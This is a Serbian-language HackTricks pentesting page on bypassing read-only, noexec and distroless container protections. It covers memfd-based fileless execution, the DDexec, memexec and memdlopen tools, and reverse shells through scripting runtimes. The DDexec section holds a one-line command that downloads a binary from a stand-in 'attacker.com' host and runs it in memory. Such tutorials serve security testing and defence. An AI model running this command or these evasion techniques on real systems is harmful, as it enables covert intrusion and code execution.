# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

U sledećim video-snimcima možete pronaći detaljnije objašnjene tehnike pomenute na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

U containeru možete montirati root filesystem kao read-only postavljanjem **`readOnlyRootFilesystem: true`** u security contextu.<sup>[[3]](#references)</sup> Na primer:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root ne čini zasebno montirane volume read-only. Docker tretira **`/dev/shm`** kao IPC mount, dok su tmpfs opcije kao što su `rw` i `noexec` izbori runtime konfiguracije; proverite opcije mounta ciljnog containera pre nego što se oslonite na bilo koje od ova dva ponašanja.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Iz perspektive red-teama, ova kombinacija može otežati preuzimanje i izvršavanje binarnih fajlova koji već nisu dostupni (na primer, backdoor-a ili enumeration alata).<sup>[[4]](#references)[[5]](#references)</sup>

## Easiest bypass: Scripts

`noexec` mount blokira direktno izvršavanje binarnih fajlova na tom mountu, ali interpreter i dalje može da pročita i interpretira skriptu. Ako su `sh` ili `python` prisutni, možete zato pokrenuti shell ili Python skriptu kroz taj interpreter.<sup>[[5]](#references)</sup>

Ovo ne pomaže kada je sam potreban alat binarni fajl.<sup>[[5]](#references)</sup>

## Memory Bypasses

Kada je direktno izvršavanje sa montirane putanje blokirano, jedna mogućnost je učitavanje ELF-a u memoriju i njegovo izvršavanje kroz in-memory putanju. Ovo zaobilazi `noexec` proveru na tom mountu, ali ne uklanja druge kernel, permission ili policy kontrole.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Ako scripting runtime može da pristupi relevantnom Linux interfejsu, može da kreira anoniman file descriptor podržan RAM-om pomoću **`memfd_create(2)`**, upiše ELF bajtove u njega i upotrebi execution putanju zasnovanu na fd-u. Projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generiše kompresovan i base64-enkodovan Python, Perl ili Ruby kod za ovaj workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Projekat trenutno dokumentuje Python, Perl i Ruby targete; PHP-u ili Node-u je potrebna druga runtime-specifična tehnika ili ekstenzija, pa odsustvo ovog generatora za neki jezik ne znači da je in-memory izvršavanje nemoguće.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Običan executable upisan u **`/dev/shm`** i dalje podleže **`noexec`** podešavanju tog mounta; samo otvaranje kroz običan file descriptor ne menja mount policy.<sup>[[5]](#references)</sup>
>
> Tačan memory-execution metod takođe zavisi od runtime-a, arhitekture, kernela i dostupnih permissiona.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) upisuje stager i loader u running shell proces kroz **`/proc/self/mem`**, a zatim prenosi kontrolu na taj kod.<sup>[[8]](#references)</sup>

Ovo omogućava procesu da učita dostavljeni binarni fajl bez prethodnog postavljanja tog binarnog fajla na executable filesystem.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** može da učita i **izvrši** shellcode ili binarni fajl iz **memorije**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici pogledajte Github ili:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je DDexec implementacija pokrenuta kao daemon. Njegov daemon osluškuje zahteve koji sadrže argumente i sirove bajtove programa, kreira child proces za učitavanje i pokretanje svakog programa, a parent proces zadržava u ulozi servera.<sup>[[9]](#references)</sup>

Repository uključuje primer korišćenja alata **memexec za izvršavanje binarnih datoteka iz PHP reverse shell-a** u datoteci [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Sa sličnom namenom kao DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) je fileless implementacija funkcije `dlopen()` za shared object ili program. Njegov README trenutno dokumentuje podršku za ARM64, zato pre korišćenja proverite arhitekturu cilja.<sup>[[10]](#references)</sup>

## Distroless Bypass

Za posebno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation tradecraft u containerima, pogledajte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless images sadrže samo aplikaciju i njene runtime dependencies; zvanične images ne sadrže package managere, shell-ove i druge programe koji se očekuju u standardnoj Linux distribuciji.<sup>[[11]](#references)</sup>

Ograničavanje runtime image-a na te dependencies smanjuje količinu softvera prisutnog u production okruženju, kao i količinu softvera koju treba skenirati i pratiti.<sup>[[11]](#references)</sup>

### Reverse Shell

U distroless containeru možda **nećete pronaći `sh` ili `bash`** za regularni shell, niti uobičajene utilities kao što su `ls`, `whoami` ili `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Zbog toga uobičajeni reverse shell zasnovan na shell-u ili enumeration zasnovan na utilities alatima možda neće raditi.<sup>[[11]](#references)</sup>

Ako compromised aplikacija uključuje language runtime (na primer, Python za Flask aplikaciju ili Node.js za Node aplikaciju), RCE možda i dalje može da koristi taj runtime za command channel i inspekciju sistema kroz njegove API-je.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Koristite dostupni scripting language za **enumeration sistema** kroz njegove jezičke mogućnosti.<sup>[[12]](#references)</sup>

Ako ne postoje **read-only/no-exec** zaštite, command channel može da upiše binarne datoteke na writable, executable mount i da ih pokrene; prvo proverite opcije mount-a i permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Kada su ove zaštite prisutne, koristite gore navedene **memory-execution tehnike** tamo gde runtime, kernel i permissions to dozvoljavaju.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Primere iskorišćavanja RCE ranjivosti za dobijanje scripting-language **reverse shell-ova** i izvršavanje binarnih datoteka iz memorije možete pronaći u projektu [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Istraživanje Linux manipulacije memorijom radi prikrivanja i izbegavanja detekcije](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions sa DDexec-ng i in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurisanje Security Context-a za Pod ili Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux stranica priručnika](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
